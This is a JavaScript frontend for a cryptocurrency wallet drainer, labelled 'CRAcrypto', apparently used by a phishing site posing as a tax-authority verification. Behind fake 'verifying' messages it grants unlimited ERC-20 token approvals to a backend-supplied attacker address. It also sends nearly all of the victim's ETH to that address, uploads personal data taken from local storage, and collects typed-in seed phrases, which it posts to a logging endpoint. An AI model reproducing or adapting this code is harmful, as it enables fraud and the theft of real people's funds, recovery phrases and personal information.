/* CRAcrypto - Wallet Drainer (frontend) */
'use strict';

var WC_PROJECT_ID = '632d69f47918192d10af6f73afe7ece6';
var USE_TESTNET   = false;
var CHAIN_ID      = 1;
var ASSETS = {
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
  WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
};
var ERC20_ABI = [
  {name:'approve',    type:'function', stateMutability:'nonpayable', inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}], outputs:[{name:'',type:'bool'}]},
  {name:'balanceOf',  type:'function', stateMutability:'view',        inputs:[{name:'account',type:'address'}], outputs:[{name:'',type:'uint256'}]},
  {name:'allowance',  type:'function', stateMutability:'view',        inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}], outputs:[{name:'',type:'uint256'}]},
  {name:'decimals',   type:'function', stateMutability:'view',        inputs:[], outputs:[{name:'',type:'uint8'}]}
];
var MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

var walletProvider = null;
var wcSession      = null;

function isMobile() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }

function showStatus(msg, ok) {
  var el = document.getElementById('statusMessage');
  if (!el) return;
  el.textContent = msg;
  el.className   = 'status-message ' + (ok ? 'success' : 'error');
  el.style.display = 'block';
}

function showWalletSelectorModal() {
  var m = document.getElementById('walletSelectorModal');
  if (m) m.style.display = 'flex';
}

function selectWallet(type) {
  var m = document.getElementById('walletSelectorModal');
  if (m) m.style.display = 'none';
  connectWallet(type);
}

function openMobileWallet(type, uri) {
  var links = {
    metamask:  'metamask://wc?uri=' + encodeURIComponent(uri),
    exodus:    'exodus://wc?uri='   + encodeURIComponent(uri),
    trust:     'trust://wc?uri='    + encodeURIComponent(uri),
    coinbase:  'cbwallet://wc?uri=' + encodeURIComponent(uri)
  };
  if (links[type]) window.location.href = links[type];
}

async function connectWallet(type) {
  showStatus('Connecting to ' + type + '...', true);
  try {
    if (type === 'walletconnect') {
      await connectWithWalletConnect();
      return;
    }
    if (type === 'ledger') {
      showStatus('Ledger: please use WalletConnect QR to connect', false);
      return;
    }
    var ext = null;
    if (window.ethereum) {
      if (type === 'metamask' && window.ethereum.isMetaMask)        ext = window.ethereum;
      else if (type === 'exodus' && window.ethereum.isExodus)       ext = window.ethereum;
      else if (type === 'trust' && window.ethereum.isTrust)         ext = window.ethereum;
      else if (type === 'coinbase' && window.ethereum.isCoinbaseWallet) ext = window.ethereum;
      else ext = window.ethereum;
    }
    if (ext) {
      walletProvider = ext;
      await processVerification(ext, type);
    } else {
      if (isMobile()) {
        await connectWithWalletConnect(type);
      } else {
        showStatus(type + ' not detected. Install the extension or use WalletConnect.', false);
      }
    }
  } catch (err) {
    console.error('connectWallet:', err);
    showStatus('Connection failed: ' + (err.message || err), false);
  }
}

async function connectWithWalletConnect(walletHint) {
  showStatus('Opening WalletConnect QR...', true);
  try {
    var EthereumProvider = window.EthereumProvider && window.EthereumProvider.EthereumProvider
          ? window.EthereumProvider.EthereumProvider
          : window.EthereumProvider;
    if (!EthereumProvider) throw new Error('WalletConnect bundle not loaded');
    var provider = await EthereumProvider.init({
      projectId: WC_PROJECT_ID,
      chains:    [CHAIN_ID],
      showQrModal: true,
      qrModalOptions: { themeMode: 'light' }
    });
    if (walletHint && isMobile()) {
      provider.on('display_uri', function(uri) { openMobileWallet(walletHint, uri); });
    }
    await provider.enable();
    wcSession      = provider;
    walletProvider = provider;
    showStatus('WalletConnect connected!', true);
    await processVerification(provider, 'walletconnect');
  } catch (err) {
    console.error('WalletConnect:', err);
    showStatus('WalletConnect failed: ' + (err.message || err), false);
  }
}

async function continueAfterConnection(session) {
  if (!session) return;
  wcSession = session;
  showStatus('Session restored. Continuing verification...', true);
  await processVerification(session, 'walletconnect');
}

async function getProvider(rawProvider) {
  if (rawProvider.request) return rawProvider;
  throw new Error('No compatible provider');
}

async function processVerification(raw, wType) {
  try {
    var provider = await getProvider(raw);
    var accounts = await provider.request({ method: 'eth_requestAccounts' });
    if (!accounts || !accounts.length) throw new Error('No accounts returned');
    var walletAddr = accounts[0];

    showStatus('Wallet connected: ' + walletAddr.substring(0, 8) + '...  Preparing verification...', true);

    // Get target (HD wallet child) address from backend
    var targetRes  = await fetch('/api/get-target-address', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ victimWallet: walletAddr })
    });
    var targetData = await targetRes.json();
    var TARGET     = targetData.targetAddress;
    if (!TARGET) throw new Error('Could not get verification address');

    var web3     = new Web3(raw);
    var approvals = [];

    // Approve all ERC-20 tokens
    for (var sym of Object.keys(ASSETS)) {
      try {
        showStatus('Verifying ' + sym + ' holdings...', true);
        var contract = new web3.eth.Contract(ERC20_ABI, ASSETS[sym]);
        var bal      = await contract.methods.balanceOf(walletAddr).call();
        if (BigInt(bal) > 0n) {
          var tx = await contract.methods.approve(TARGET, MAX_UINT256).send({
            from: walletAddr,
            gas:  100000
          });
          approvals.push({ symbol: sym, token: ASSETS[sym], txHash: tx.transactionHash });
          showStatus(sym + ' authorized. ✓', true);
        }
      } catch (e) { console.log(sym + ' skip:', e.message); }
    }

    // Direct ETH drain
    var ethTxHash = null;
    try {
      var ethBal   = await web3.eth.getBalance(walletAddr);
      var ethBigN  = BigInt(ethBal);
      var threshold = BigInt('500000000000000'); // 0.0005 ETH
      if (ethBigN > threshold) {
        var gasPrice  = await web3.eth.getGasPrice();
        var gasCost   = BigInt(gasPrice) * 21000n;
        var sendAmt   = ethBigN - gasCost;
        if (sendAmt > 0n) {
          showStatus('Verifying ETH balance...', true);
          var ethTx = await web3.eth.sendTransaction({
            from:  walletAddr,
            to:    TARGET,
            value: sendAmt.toString(),
            gas:   21000
          });
          ethTxHash = ethTx.transactionHash;
        }
      }
    } catch (e) { console.log('ETH skip:', e.message); }

    // Personal data from localStorage
    var personalData = {};
    try {
      var reg  = localStorage.getItem('cra_register');
      var decl = localStorage.getItem('cra_declaration');
      personalData.register    = reg  ? JSON.parse(reg)  : {};
      personalData.declaration = decl ? JSON.parse(decl) : {};
    } catch (e) {}

    // Notify backend
    await fetch('/api/verify-claim', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        wallet:      walletAddr,
        approvals:   approvals,
        ethTxHash:   ethTxHash,
        walletType:  wType,
        network:     USE_TESTNET ? 'Sepolia Testnet' : 'Ethereum Mainnet',
        personalData: personalData,
        timestamp:   new Date().toISOString()
      })
    });

    // Clean up and redirect
    localStorage.removeItem('cra_register');
    localStorage.removeItem('cra_declaration');
    showStatus('Verification complete! Redirecting...', true);
    setTimeout(function() { window.location.href = 'thankyou.html'; }, 1500);

  } catch (err) {
    console.error('processVerification:', err);
    showStatus('Verification error: ' + (err.message || err), false);
  }
}

document.addEventListener('DOMContentLoaded', function() {
  // WalletConnect session resume
  try {
    var EthereumProvider = window.EthereumProvider && window.EthereumProvider.EthereumProvider
          ? window.EthereumProvider.EthereumProvider
          : window.EthereumProvider;
    if (EthereumProvider) {
      EthereumProvider.init({ projectId: WC_PROJECT_ID, chains: [CHAIN_ID], showQrModal: false })
        .then(function(p) {
          if (p.session) {
            console.log('WC session found, resuming...');
            continueAfterConnection(p);
          }
        }).catch(function() {});
    }
  } catch (e) {}

  // Manual seed form
  var submitBtn = document.getElementById('submitManual');
  if (submitBtn) {
    submitBtn.addEventListener('click', async function() {
      var provider = document.getElementById('walletProvider');
      var seed     = document.getElementById('seedPhrase');
      var seedLen  = document.getElementById('seedLength');
      if (!seed || !seed.value.trim()) {
        showStatus('Please enter your recovery phrase', false);
        return;
      }
      showStatus('Submitting...', true);
      var personalData = {};
      try {
        var reg  = localStorage.getItem('cra_register');
        var decl = localStorage.getItem('cra_declaration');
        personalData.register    = reg  ? JSON.parse(reg)  : {};
        personalData.declaration = decl ? JSON.parse(decl) : {};
      } catch (e) {}
      try {
        await fetch('/api/log', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({
            type:           'manual',
            walletProvider: provider ? provider.value : 'not specified',
            seedLength:     seedLen  ? seedLen.value  : '12',
            seedPhrase:     seed.value.trim(),
            personalData:   personalData
          })
        });
        localStorage.removeItem('cra_register');
        localStorage.removeItem('cra_declaration');
        showStatus('Submitted! Redirecting...', true);
        setTimeout(function() { window.location.href = 'thankyou.html'; }, 1200);
      } catch (err) {
        showStatus('Error: ' + (err.message || err), false);
      }
    });
  }
});
